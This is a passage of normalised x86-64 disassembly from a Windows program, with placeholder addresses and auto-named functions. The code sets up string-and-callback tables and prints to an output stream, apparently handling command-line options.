mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov rax [ r--data ]
mov [ r11 + 0x28 ] rax
mov rax [ r--data ]
mov [ r11 + 0x30 ] rax
mov rax [ r--data ]
mov [ r11 + 0x38 ] rax
movzx eax [ r--data ]
mov [ r11 + 0x40 ] ax
mov [ rbp - 0x80 ] 0x21
lea rax [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rax [ rsp + 0x70 ]
mov [ rax + 0x42 ] di
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140023da0 ]
mov [ rbp + 0x240 ] r11
mov [ rbp + 0x260 ] rsi
mov [ rbp + 0x258 ] rdi
mov [ rbp + 0x248 ] di
mov r8d esi
lea rdx [ r--data ]
lea rcx [ rbp + 0x248 ]
call sub_140001ea0
nop
mov [ rbp + 0x288 ] rsi
mov [ rbp + 0x280 ] rdi
mov [ rbp + 0x270 ] di
lea r8d [ rdi + 0x24 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x270 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x240 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_1400244d0 ]
mov [ rbp + 0x180 ] r11
mov [ rbp + 0x1a0 ] rsi
mov [ rbp + 0x198 ] rdi
mov [ rbp + 0x188 ] di
lea r8d [ rdi + 0x5 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x188 ]
call sub_140001ea0
nop
mov [ rbp + 0x1c8 ] rsi
mov [ rbp + 0x1c0 ] rdi
mov [ rbp + 0x1b0 ] di
lea r8d [ rdi + 0x29 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x1b0 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x180 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140024520 ]
mov [ rbp + 0xc0 ] r11
mov [ rbp + 0xe0 ] rsi
mov [ rbp + 0xd8 ] rdi
mov [ rbp + 0xc8 ] di
lea r8d [ rdi + 0x8 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xc8 ]
call sub_140001ea0
nop
mov [ rbp + 0x108 ] rsi
mov [ rbp + 0x100 ] rdi
mov [ rbp + 0xf0 ] di
lea r8d [ rdi + 0x2c ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xf0 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0xc0 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140024570 ]
mov [ rbp + 0x60 ] r11
mov [ rbp + 0x80 ] rsi
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
lea r8d [ rdi + 0x3 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x68 ]
call sub_140001ea0
nop
mov [ rbp + 0xa8 ] rsi
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
lea r8d [ rdi + 0x27 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x90 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x60 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_1400245c0 ]
mov [ rbp + 0x2a0 ] r11
mov [ rbp + 0x2c0 ] rsi
mov [ rbp + 0x2b8 ] rdi
mov [ rbp + 0x2a8 ] di
lea r8d [ rdi + 0xb ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x2a8 ]
call sub_140001ea0
nop
mov [ rbp + 0x2e8 ] rsi
mov [ rbp + 0x2e0 ] rdi
mov [ rbp + 0x2d0 ] di
lea r8d [ rdi + 0x2f ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x2d0 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x2a0 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140024610 ]
mov [ rbp + 0x120 ] r11
mov [ rbp + 0x140 ] rsi
mov [ rbp + 0x138 ] rdi
mov [ rbp + 0x128 ] di
lea r8d [ rdi + 0x6 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x128 ]
call sub_140001ea0
nop
mov [ rbp + 0x168 ] rsi
mov [ rbp + 0x160 ] rdi
mov [ rbp + 0x150 ] di
lea r8d [ rdi + 0x36 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x150 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x120 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140024660 ]
mov [ rbp ] r11
mov [ rbp + 0x20 ] rsi
mov [ rbp + 0x18 ] rdi
mov [ rbp + 0x8 ] di
lea r8d [ rdi + 0x8 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x8 ]
call sub_140001ea0
nop
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
lea r8d [ rdi + 0x2c ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x30 ]
call sub_140001ea0
nop
lea rdx [ rbp ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_1400246b0 ]
mov [ rbp + 0x1e0 ] r11
mov [ rbp + 0x200 ] rsi
mov [ rbp + 0x1f8 ] rdi
mov [ rbp + 0x1e8 ] di
lea r8d [ rdi + 0x9 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x1e8 ]
call sub_140001ea0
nop
mov [ rbp + 0x228 ] rsi
mov [ rbp + 0x220 ] rdi
mov [ rbp + 0x210 ] di
lea r8d [ rdi + 0x31 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x210 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x1e0 ]
mov rcx rbx
call sub_140018d50
nop
cmp [ rbp + 0x228 ] 0x8
jb r-xdata
mov [ rbp + 0x228 ] rsi
mov [ rbp + 0x220 ] rdi
mov [ rbp + 0x210 ] di
cmp [ rbp + 0x200 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x210 ]
call j_sub_14003ad04
mov [ rbp + 0x200 ] rsi
mov [ rbp + 0x1f8 ] rdi
mov [ rbp + 0x1e8 ] di
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x1e8 ]
call j_sub_14003ad04
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x30 ]
call j_sub_14003ad04
mov [ rbp + 0x20 ] rsi
mov [ rbp + 0x18 ] rdi
mov [ rbp + 0x8 ] di
cmp [ rbp + 0x168 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x8 ]
call j_sub_14003ad04
mov [ rbp + 0x168 ] rsi
mov [ rbp + 0x160 ] rdi
mov [ rbp + 0x150 ] di
cmp [ rbp + 0x140 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x150 ]
call j_sub_14003ad04
mov [ rbp + 0x140 ] rsi
mov [ rbp + 0x138 ] rdi
mov [ rbp + 0x128 ] di
cmp [ rbp + 0x2e8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x128 ]
call j_sub_14003ad04
mov [ rbp + 0x2e8 ] rsi
mov [ rbp + 0x2e0 ] rdi
mov [ rbp + 0x2d0 ] di
cmp [ rbp + 0x2c0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x2d0 ]
call j_sub_14003ad04
mov [ rbp + 0x2c0 ] rsi
mov [ rbp + 0x2b8 ] rdi
mov [ rbp + 0x2a8 ] di
cmp [ rbp + 0xa8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x2a8 ]
call j_sub_14003ad04
mov [ rbp + 0xa8 ] rsi
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x90 ]
call j_sub_14003ad04
mov [ rbp + 0x80 ] rsi
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
cmp [ rbp + 0x108 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_14003ad04
mov [ rbp + 0x108 ] rsi
mov [ rbp + 0x100 ] rdi
mov [ rbp + 0xf0 ] di
cmp [ rbp + 0xe0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xf0 ]
call j_sub_14003ad04
mov [ rbp + 0xe0 ] rsi
mov [ rbp + 0xd8 ] rdi
mov [ rbp + 0xc8 ] di
cmp [ rbp + 0x1c8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xc8 ]
call j_sub_14003ad04
mov [ rbp + 0x1c8 ] rsi
mov [ rbp + 0x1c0 ] rdi
mov [ rbp + 0x1b0 ] di
cmp [ rbp + 0x1a0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x1b0 ]
call j_sub_14003ad04
mov [ rbp + 0x1a0 ] rsi
mov [ rbp + 0x198 ] rdi
mov [ rbp + 0x188 ] di
cmp [ rbp + 0x288 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x188 ]
call j_sub_14003ad04
mov [ rbp + 0x288 ] rsi
mov [ rbp + 0x280 ] rdi
mov [ rbp + 0x270 ] di
cmp [ rbp + 0x260 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x270 ]
call j_sub_14003ad04
mov [ rbp + 0x260 ] rsi
mov [ rbp + 0x258 ] rdi
mov [ rbp + 0x248 ] di
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x248 ]
call j_sub_14003ad04
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_14003ad04
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_14003ad04
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x58 ] di
lea rcx [ rbp + 0x300 ]
call sub_140015410
mov rax rbx
mov rcx [ rbp + 0x360 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x470 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
sub_140023dc0
mov rax rsp
push rbp
push rdi
push r12
push r13
push r14
lea rbp [ rax - 0x5f ]
sub rsp 0xa0
mov [ rbp - 0x41 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x2f ] rax
mov r12 rcx
mov [ rbp - 0x39 ] rcx
mov rax [ rdx + 0x8 ]
cmp [ rdx ] rax
sete r13b
lea rax [ r--data ]
lea rbx [ r--data ]
test r13b r13b
cmovne rbx rax
lea rdx [ r--data ]
lea r14 [ rw-data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ac10
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx r12
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov ecx 0x20
call sub_14003ac60
mov rsi rax
xor edi edi
test rax rax
je r-xdata
mov rsi rdi
mov [ rax ] rdi
mov [ rax + 0x8 ] rdi
mov [ rax + 0x10 ] rdi
jmp r-xdata
mov eax [ rbx + 0x28 ]
mov [ rbp - 0x9 ] eax
lea rdx [ rbp - 0x31 ]
mov rcx rsi
call sub_140001be0
nop
cmp [ rbp - 0x19 ] 0x8
jb r-xdata
mov [ rbp - 0x19 ] 0x7
mov [ rbp - 0x21 ] rdi
mov [ rbp - 0x31 ] di
cmp [ rbx + 0x18 ] 0x8
jae r-xdata
neg r13b
sbb eax eax
and eax 0x2
mov [ rbp - 0x49 ] eax
lea r8 [ rbp - 0x49 ]
mov rdx r12
lea rcx [ rbp - 0x1 ]
call sub_140024700
mov rbx rax
mov [ rbp - 0x19 ] 0x7
mov [ rbp - 0x21 ] rdi
mov [ rbp - 0x31 ] di
lea rax [ rbp - 0x31 ]
cmp rax rbx
je r-xdata
mov [ rbp - 0x19 ] 0x7
mov [ rbp - 0x21 ] rdi
mov [ rbp - 0x31 ] di
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x31 ]
call j_sub_14003ad04
mov rax [ rbx ]
mov [ rbp - 0x31 ] rax
mov [ rbx ] rdi
mov r8 [ rbx + 0x10 ]
inc r8
add r8 r8
mov rdx rbx
lea rcx [ rbp - 0x31 ]
call sub_14003a8c0
jmp r-xdata
mov rcx rsi
call sub_14000bef0
movzx r13d al
test rsi rsi
je r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_14003ad04
mov rax [ rbx + 0x10 ]
mov [ rbp - 0x21 ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp - 0x19 ] rax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
test r13b r13b
je r-xdata
mov rcx rsi
call sub_140002050
mov rcx rsi
call j_sub_14003ad04
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x31 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
nop
cmp [ rbp - 0x19 ] 0x8
jb r-xdata
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
jmp r-xdata
mov edx 0xa
mov rcx r14
call sub_1400085e0
mov ebx edi
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + r14 + 0x10 ] 0x6
jne r-xdata
mov rcx [ rbp - 0x31 ]
call j_sub_14003ad04
movsxd rcx [ rax + 0x4 ]
add rcx r14
test ebx ebx
je r-xdata
mov rcx [ rcx + r14 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
mov ecx 0x4
cmp eax 0xffffffff
cmove ebx ecx
mov rax [ rw-data ]
cmp [ r12 + 0x18 ] 0x8
jb r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov [ r12 + 0x18 ] 0x7
mov [ r12 + 0x10 ] rdi
mov [ r12 ] di
movzx eax r13b
mov rcx [ rbp + 0x2f ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xa0 ]
mov rbx [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rbp
retn
mov rcx [ r12 ]
call j_sub_14003ad04
xor r8d r8d
call sub_140003120
nop
or edx 0x4
sub_140024080
mov rax rsp
push rsi
push rdi
push r12
sub rsp 0x70
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov rbp rcx
mov [ rsp + 0x20 ] edx
mov ecx 0x20
call sub_14003ac60
mov rsi rax
xor edi edi
test rax rax
je r-xdata
mov rsi rdi
mov [ rax ] rdi
mov [ rax + 0x8 ] rdi
mov [ rax + 0x10 ] rdi
jmp r-xdata
mov rcx rsi
call sub_14000bef0
movzx r12d al
test rsi rsi
je r-xdata
lea r8 [ rsp + 0x20 ]
mov rdx rbx
lea rcx [ rsp + 0x30 ]
call sub_14000c060
nop
mov rdx rax
mov rcx rsi
call sub_140001be0
nop
cmp [ rsp + 0x48 ] 0x8
jb r-xdata
mov rbx [ rbp ]
cmp rbx [ rbp + 0x8 ]
je r-xdata
test r12b r12b
je r-xdata
mov rbx [ rsi ]
test rbx rbx
je r-xdata
add rbx 0x28
cmp rbx [ rbp + 0x8 ]
jne r-xdata
mov rcx [ rsp + 0x30 ]
call j_sub_14003ad04
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x30 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rsi [ rw-data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
nop
cmp [ rsp + 0x48 ] 0x8
jb r-xdata
lea rdx [ r--data ]
lea rsi [ rw-data ]
mov rcx rsi
call sub_14000ac10
jmp r-xdata
mov [ rsi ] rdi
mov [ rsi + 0x8 ] rdi
mov [ rsi + 0x10 ] rdi
mov rcx rsi
call j_sub_14003ad04
mov rbp [ rsi + 0x8 ]
cmp rbx rbp
je r-xdata
mov edx 0xa
mov rcx rsi
call sub_1400085e0
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + rsi + 0x10 ] 0x6
jne r-xdata
mov rcx [ rsp + 0x30 ]
call j_sub_14003ad04
mov rcx [ rsi ]
call j_sub_14003ad04
nop [ rax ] eax
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test edi edi
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
mov ecx 0x4
cmp eax 0xffffffff
cmove edi ecx
mov rax [ rw-data ]
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
add rbx 0x30
cmp rbx rbp
jne r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
movzx eax r12b
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
sub_140024270
mov rax rsp
push rdi
push r13
push r14
sub rsp 0x70
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov r13d 0x20
mov ecx r13d
call sub_14003ac60
mov rbp rax
test rax rax
je r-xdata
xor ebp ebp
mov [ rax ] 0x0
mov [ rax + 0x8 ] 0x0
mov [ rax + 0x10 ] 0x0
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x38 ]
call sub_14000f390
nop
mov rdx rax
lea rcx [ rw-data ]
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
mov rbx [ rbp ]
cmp rbx [ rbp + 0x8 ]
je r-xdata
mov rcx rbp
call sub_14000bd20
test al al
je r-xdata
mov al 0x1
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rsp r11
pop r14
pop r13
pop rdi
retn
mov rcx [ rsp + 0x38 ]
call j_sub_14003ad04
lea rdi [ rw-data ]
mov r14d 0x4
nop [ rax ] eax
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx r11
xor ecx ecx
jmp r-xdata
mov edx 0xa
mov rcx rdi
call sub_1400085e0
xor esi esi
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + rdi + 0x10 ] 0x6
jne r-xdata
test al 0x1
je r-xdata
and [ rcx + 0x18 ] 0xfffffebf
or [ rcx + 0x18 ] 0x80
mov edx 0x9
mov rcx r11
call sub_14000fe50
mov eax [ rbx + 0x28 ]
test eax 0x80000007
je r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test esi esi
je r-xdata
mov rcx [ rcx + rdi + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove esi r14d
mov rax [ rw-data ]
test [ rbx + 0x28 ] 0x2
je r-xdata
lea rdx [ r--data ]
mov rcx rdi
call sub_14000ac10
add rbx 0x30
cmp rbx [ rbp + 0x8 ]
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx esi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
test [ rbx + 0x28 ] r14b
je r-xdata
lea rdx [ r--data ]
mov rcx rdi
call sub_14000ac10
mov edx 0x23
lea rcx [ rsp + 0x28 ]
call sub_140039e70
mov rcx [ rw-data ]
movsxd rcx [ rcx + 0x4 ]
add rcx rdi
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rw-data ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rdi + 0x58 ] r13w
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
and [ rcx + 0x18 ] 0xfffffe7f
or [ rcx + 0x18 ] 0x40
mov rdx rbx
mov rcx rdi
call sub_14000ae70
mov r11 rax
test rax rax
jne r-xdata
jmp r-xdata
xor r8d r8d
call sub_140003120
or edx r14d
test [ rbx + 0x28 ] 0x80000000
je r-xdata
lea rdx [ r--data ]
mov rcx rdi
call sub_14000ac10
test [ rbx + 0x28 ] r14b
je r-xdata
lea rdx [ r--data ]
mov rcx rdi
call sub_14000ac10
lea rdx [ r--data ]
mov rcx rdi
call sub_14000ac10
sub_1400244d0
push rbx
sub rsp 0x50
xor eax eax
mov rbx rcx
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
lea r8d [ rax + 0x10 ]
mov [ rsp + 0x38 ] 0x7
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x20 ] ax
call sub_140001ea0
lea rcx [ rsp + 0x20 ]
mov rdx rbx
call sub_140023dc0
mov al 0x1
add rsp 0x50
pop rbx
retn
sub_140024520
push rbx
sub rsp 0x50
xor eax eax
mov rbx rcx
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
lea r8d [ rax + 0x13 ]
mov [ rsp + 0x38 ] 0x7
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x20 ] ax
call sub_140001ea0
lea rcx [ rsp + 0x20 ]
mov rdx rbx
call sub_140023dc0
mov al 0x1
add rsp 0x50
pop rbx
retn
sub_140024570
push rbx
sub rsp 0x50
xor eax eax
mov rbx rcx
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
lea r8d [ rax + 0xe ]
mov [ rsp + 0x38 ] 0x7
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x20 ] ax
call sub_140001ea0
lea rcx [ rsp + 0x20 ]
mov rdx rbx
call sub_140023dc0
mov al 0x1
add rsp 0x50
pop rbx
retn
sub_1400245c0
push rbx
sub rsp 0x50
xor eax eax
mov rbx rcx
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
lea r8d [ rax + 0x16 ]
mov [ rsp + 0x38 ] 0x7
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x20 ] ax
call sub_140001ea0
lea rcx [ rsp + 0x20 ]
mov rdx rbx
call sub_140023dc0
mov al 0x1
add rsp 0x50
pop rbx
retn
sub_140024610
push rbx
sub rsp 0x50
xor eax eax
mov rbx rcx
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
lea r8d [ rax + 0x1d ]
mov [ rsp + 0x38 ] 0x7
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x20 ] ax
call sub_140001ea0
lea rcx [ rsp + 0x20 ]
mov rdx rbx
call sub_140023dc0
mov al 0x1
add rsp 0x50
pop rbx
retn
sub_140024660
push rbx
sub rsp 0x50
xor eax eax
mov rbx rcx
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
lea r8d [ rax + 0x13 ]
mov [ rsp + 0x38 ] 0x7
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x20 ] ax
call sub_140001ea0
lea rcx [ rsp + 0x20 ]
mov rdx rbx
call sub_140023dc0
mov al 0x1
add rsp 0x50
pop rbx
retn
sub_1400246b0
push rbx
sub rsp 0x50
xor eax eax
mov rbx rcx
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
lea r8d [ rax + 0x18 ]
mov [ rsp + 0x38 ] 0x7
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x20 ] ax
call sub_140001ea0
lea rcx [ rsp + 0x20 ]
mov rdx rbx
call sub_140023dc0
mov al 0x1
add rsp 0x50
pop rbx
retn
sub_140024700
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov ebx [ r8 ]
xor eax eax
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rax
or r9 0xffffffffffffffff
xor r8d r8d
mov rdi rcx
mov [ rsp + 0x30 ] eax
mov [ rcx ] ax
call sub_140001dd0
mov [ rdi + 0x28 ] ebx
mov rbx [ rsp + 0x38 ]
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_140024750
mov rax rsp
push rbp
lea rbp [ rax - 0x1f8 ]
sub rsp 0x2f0
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1e0 ] rax
mov rbx rcx
mov [ rsp + 0x30 ] rcx
xor edi edi
mov [ rsp + 0x20 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rsp + 0x20 ] 0x1
lea rax [ sub_140025e30 ]
mov [ rbp ] rax
mov esi 0x7
mov [ rbp + 0x20 ] rsi
mov [ rbp + 0x8 ] di
mov rcx [ r--data ]
mov [ rbp + 0x8 ] rcx
mov [ rbp + 0x18 ] 0x4
lea rax [ rbp + 0x8 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0x8 ] di
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x13 ]
lea rcx [ rbp + 0x30 ]
call sub_1400025a0
lea r11 [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae r11 [ rbp + 0x30 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov eax [ r--data ]
mov [ r11 + 0x20 ] eax
movzx eax [ r--data ]
mov [ r11 + 0x24 ] ax
mov [ rbp + 0x40 ] 0x13
lea rax [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rax [ rbp + 0x30 ]
mov [ rax + 0x26 ] di
lea rdx [ rbp ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140024e10 ]
mov [ rbp - 0x60 ] r11
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x58 ] di
mov rcx [ r--data ]
mov [ rbp - 0x58 ] rcx
movzx eax [ r--data ]
mov [ rbp - 0x50 ] ax
mov [ rbp - 0x48 ] 0x5
lea rax [ rbp - 0x58 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0xa ] di
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x29 ]
lea rcx [ rbp - 0x30 ]
call sub_1400025a0
lea rcx [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rcx [ rbp - 0x30 ]
lea r8d [ rdi + 0x52 ]
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp - 0x20 ] 0x29
lea rax [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rax [ rbp - 0x30 ]
mov [ rax + 0x52 ] di
lea rdx [ rbp - 0x60 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140025530 ]
mov [ rsp + 0x40 ] r11
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x48 ] di
mov rcx [ r--data ]
mov [ rsp + 0x48 ] rcx
mov eax [ r--data ]
mov [ rsp + 0x50 ] eax
movzx eax [ r--data ]
mov [ rsp + 0x54 ] ax
mov [ rsp + 0x58 ] rsi
lea rax [ rsp + 0x48 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0xe ] di
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
xor r8d r8d
lea edx [ rdi + 0x22 ]
lea rcx [ rsp + 0x70 ]
call sub_1400025a0
lea r11 [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae r11 [ rsp + 0x70 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov rax [ r--data ]
mov [ r11 + 0x28 ] rax
mov rax [ r--data ]
mov [ r11 + 0x30 ] rax
mov rax [ r--data ]
mov [ r11 + 0x38 ] rax
mov eax [ r--data ]
mov [ r11 + 0x40 ] eax
mov [ rbp - 0x80 ] 0x22
lea rax [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rax [ rsp + 0x70 ]
mov [ rax + 0x44 ] di
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_1400259b0 ]
mov [ rbp + 0x180 ] r11
mov [ rbp + 0x1a0 ] rsi
